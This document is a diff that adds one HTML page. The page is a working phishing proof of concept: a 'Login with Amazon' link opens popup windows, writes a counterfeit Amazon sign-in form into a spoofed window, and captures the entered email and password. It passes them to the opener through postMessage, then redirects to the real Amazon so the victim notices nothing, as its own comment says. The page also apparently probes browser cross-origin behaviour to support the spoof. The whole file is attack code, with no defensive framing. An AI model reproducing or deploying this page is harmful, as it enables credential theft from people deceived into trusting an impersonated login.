@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <a href="#" onclick="f()">Login with Amazon</a>
+    <script>
+        function next() {
+            w.location.replace('http://www.google.com/csi');
+        }
+      
+        function f() {
+            // Encode the HTML content to avoid syntax issues
+            const htmlContent = `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Amazon Sign-In</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; }
+        .login-form { max-width: 300px; margin: 0 auto; }
+        input { width: 100%; padding: 10px; margin: 5px 0; }
+        button { width: 100%; padding: 10px; background: #FF9900; border: none; }
+    </style>
+</head>
+<body>
+    <div class="login-form">
+        <h2>Amazon Sign-In</h2>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Email or mobile number">
+            <input type="password" id="password" placeholder="Password">
+            <button type="submit">Sign in</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').onsubmit = function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Send credentials back to parent before redirect
+            window.opener.postMessage({
+                type: 'credentials',
+                email: email,
+                password: password
+            }, '*');
+            
+            // Then redirect to actual Amazon to make it look legitimate
+            window.location.href = 'https://amazon.com';
+        };
+    <\\/script>
+</body>
+</html>`.replace(/\n/g, ' ').replace(/\s+/g, ' ');
+
+            // Create first window
+            spoofWindow = window.open('javascript:void(0)', 'spoof', 'width=600,height=400');
+            
+            // Create second window with javascript URL
+            w = window.open(
+                "javascript:spoofWindow.document.write('" + htmlContent + "'); location='http://amazon.com'",
+                "new",
+                "width=500,height=500"
+            );
+            
+            // Monitor for cross-origin restriction
+            i = setInterval(function() {
+                try { 
+                    x = w.location.href; 
+                } catch(e) { 
+                    clearInterval(i); 
+                    next(); 
+                }
+            }, 1);
+        }
+    </script>
+</body>
+</html>
